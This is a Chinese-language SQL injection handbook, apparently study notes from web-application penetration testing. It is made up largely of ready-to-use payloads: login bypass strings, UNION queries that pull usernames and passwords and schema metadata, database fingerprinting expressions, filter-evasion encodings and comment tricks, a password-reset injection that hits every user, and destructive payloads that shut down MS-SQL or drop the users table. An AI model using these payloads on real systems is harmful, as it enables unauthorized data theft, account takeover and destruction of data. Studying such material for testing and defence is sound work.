# SQL注入实用手册

## SQL注入常用Payload

### 避开登录

**SQL语句：**`select * from users where username = '$injection' and password = 'password'`

**Payload：**

    1. username'--
    2. ' or 1=1--

> 注意：--代表注释符。

### 利用一个基本的漏洞

**SQL语句：**`select author, title, year from books where publisher = '$injection' and published = 1`

**Payload：**

    1. publisher' or 1=1--
    2. publisher' or 'a'='a

### 注入不同的语句类型

**select语句：**

如上所述，通常在where子句中，偶尔也出现在order by子句或表和列名称。

**insert语句：**

**SQL语句：**`insert into users (username, password, ID) values ('$injection', 'password', 20)`

**Payload：**

    1. username', 'password', 1)--

> 可以在values子句中持续增加一个新的字段，猜测insert语句需要提交的参数个数。大多数数据库都会隐式地将一个整数转换为一个字符串。

    username')--
    username', 1)--
    username', 1, 1)--

**update语句：**

**SQL语句：**`update users set password='newpassword' where user = '$injection' and password = 'password'`

**Payload：**

    1. admin'--
    2. admin' or 1=1--    # 危险！，会重置每一名用户的密码

**delete语句：**

与update语句类似。

## 查明SQL注入漏洞

### 注入字符串数据

**渗透测试步骤：**

1. 提交一个单引号作为目标查询的数据。观察是否会造成错误，或结果是否与原始结果不同。如果收到错误信息，了解该消息的含义。

2. 如果发现错误或其他异常行为，同时提交两个单引号，看会出现什么情况。数据库使用两个单引号作为转义序列，表示一个原义单引号，这个序列会被解释成引用字符串中的数据，而不是结束字符串的终止符。如果这个输入导致错误或异常行为消失，则应用程序可能存在SQL注入攻击。

3. 为进一步核实漏洞是否存在，可以使用SQL连接符建立一个等同于“良性”输入的字符串。如果应用程序以与处理对应的“良性”输入相同的方式处理专门设计的输入，那么它很可能存在SQL注入。例如，注入以下实例构建等同于foo的输入：

        Oracle：' || 'foo
        MS-SQL：'+'foo
        MySQL：'(空格)'foo

> 可以通过在特定的参数中提交SQL通配符%来确定应用程序是否与后端数据库交互。

### 注入数字数据

**渗透测试步骤：**

1. 尝试输入一个结果等于原始数字值的简单数学表达式。例如，如果原始值为2，尝试提交1+1或者3-1。如果应用程序做出相同的响应，则表示它易于受到攻击。

2. 如果证实被修改的数据会对应用程序的行为造成明显影响，则前面的描述的测试方法最为可靠。如果在上述的数字化参数中插入任意输入，但是应用程序的行为却没有发生改变，那么前面的检测方法就无法发现漏洞。

3. 如第一个测试方法取得成功，就可以利用更加复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证据。例如，以下表达式等于2：

        67-ASCII('A')

4. 如果单引号被过滤掉，那前面的测试方法就没有作用。但是，在必要时，数据库会隐含地将数字数据转为字符串数据。例如，因为字符1的ASCII值为49，在SQL中，以下表达式等于2：

        51-ASCII(1)

> 在探查SQL注入过程中，注意对某些特殊字符进行恰当的编码，如：

    & = (空格) + ;

### 注入查询结构

**渗透测试步骤：**

1. 记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数。

2. 提供一系列在参数值中提交数字值的请求，从数字1开始，然后逐个请求递增。

如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到oder by子句中。在SQL中，order by 1将依据第一个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，可以通过使用以下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他SQL：

    1 ASC --
    1 DESC --

如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中，例如：

    select 1, title, year from books where publisher='Wiley'

> 可以使用嵌套查询替代参数，如：`select 1 where <<condition>> or 1/0=0`

## 识别数据库类型

根据数据库连接字符串的不同方式进行识别。在控制某个字符串数据项的查询中，可以在一个请求中提交一个特殊的值，然后测试各种连接方法，以生成那个字符串。如果得到相同的结果，则可以确定使用的数据库类型。如services字符串：

    Oracle：'serv' || 'ices'
    MS-SQL：'serv' + 'ices'
    MySQL：'serv'(空格)'ices'

如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项在目标数据库中的求值结果为0，在其他数据库中则会导致错误。

    Oracle：BITAND(1,1)-BITAND(1,1)
    MS-SQL：@@PACK_RECEIVED-@@PACK_RECEIVED
    MySQL：CONNECTION_ID()-CONNECTION_ID()

## UNION操作符

**SQL语句：**`select author, title from books where publisher='$injection'`

**Payload：**

    1. publisher' union select username, password from users--    # 可以从不同的数据库表中提取数据
    2. ' union select @@version, NULL--    # 查询数据库版本
    3. ' union select banner, NULL from v$version--    # 查询数据库版本（适用Oracle）

> 注意：使用union操作符组合两个查询的结果，这两个结果必须结构相同。还有，要注入另一个返回有用结果的查询，攻击者必须知道所针对的数据库表的名称以及有关列的名称。

**渗透测试步骤：**

 攻击者首要任务是查明应用程序执行的最初查询所返回的列数。有两种方法：

1. 利用NULL被转换为任何数据类型，系统性地注入包含不同列数的查询，直到注入的查询得到执行。查询得到执行说明使用了正确的列数。如果应用程序不返回数据库错误信息，可以通过收到包含NULL或一个空字符串的另外一行数据确认查询是否执行。例如：

        ' union select null--
        ' union select null, null--
        ' union select null, null, null--

2. 确定所需的列数后，便是要寻找一个使用字符串数据类型的列，以便通过它从数据库中提取任何数据。使用字符串代替NULL，例如查询必须返回3列，如果注入得到执行，将看到一行包含a值的数据，然后就可以使用相关列从数据库中提取数据了：

        ' union select 'a', NULL, NULL--
        ' union select NULL, 'a', NULL--
        ' union select NULL, NULL, 'a'--

> Oracle数据库中需使用以下语句测试：

    ' union select NULL from DUAL--

### 使用UNION提取数据

1. 确定请求的列数。

2. 查找包含字符串数据的列。

3. 查询元数据表。

**Payload：**

    1. payload' union select table_name, column_name, null from information_schema.columns--    # MS-SQL数据库

> MS-SQL、MySQL和许多其他数据库均支持information_schema，但是Oracle不支持。Oracle使用`select table_name, column_name from all_tab_columns`来检索有关数据库表和列的信息。

通常，在分析大型数据库时，最好查找有用的列名称，而不是表，如：

    select table_name, column_name from information_schema.columns where column_name like '%payload%'

如果目标表返回了多个列，则可以将这些列串联到单独一个列中，这样检索起来更加方便，因为这时只需要在原始查询中确定一个varchar字段：

    Oracle: select table_name||':'||column_name from all _tab_columns
    MS-SQL: select table_name+':'+column_name from information_schema.columns
    MySQL: select concat(table_name, ':', column_name) from information_schema.columns

## 避开过滤

**避免使用被阻止的字符**

1. 如果注入数字数据字段或列名称，不一定必须使用单引号。

        select ename from emp where ename=char(109)+char(97)+char(109)    # MS-SQL

2. 如果注释符号被过滤，设计注入的数据不破坏查询的语法。

        ' or 'a'='a

3. 在MS-SQL数据库中注入批量查询时，不必使用分号分隔符。只要纠正所有批量查询的语法，无论你是否使用分号，查询解析器都会正确解释它们。

**避免使用简单确认**

例如，如果select关键字被阻止或删除，可以使用：

    SeLeCt
    %00SELECT
    SELSELECTECT
    %53%45%4c%45%43%54
    %2553%2545%254c%2545%2543%2554

**使用SQL注释**

在SQL语句中插入注释：

    select/*foo*/username /*foo*/from/*foo*/users

**利用有缺陷的过滤**

输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。

## 二阶SQL注入

**SQL语句：**`select book from books where id = '1'`

1. 攻击者提交恶意数据

        1'--

2. 恶意数据被转义

        1\'--

3. 数据在写入数据库中时

        1'--

4. 当第二次查询数据库中的数据而不进行转义时，恶意数据将被重新拼接到SQL语句中

        1'--

## 高级利用

破坏数据库。

    ' shutdown--    # 关闭MS-SQL数据库
    ' drop table users--

**获取数字数据**

关键函数：

    ASCII('A')
    SUBSTRING('Admin', 1, 1)（或Oracle中的SUBSTR）

**使用带外通道**

利用数据库的一些内置功能在数据库与自己的计算机之间建立网络连接，传送从数据库中收集到的任何数据。



## 附录：

1. MySQL注释字符：

    --(空格) 或者 #
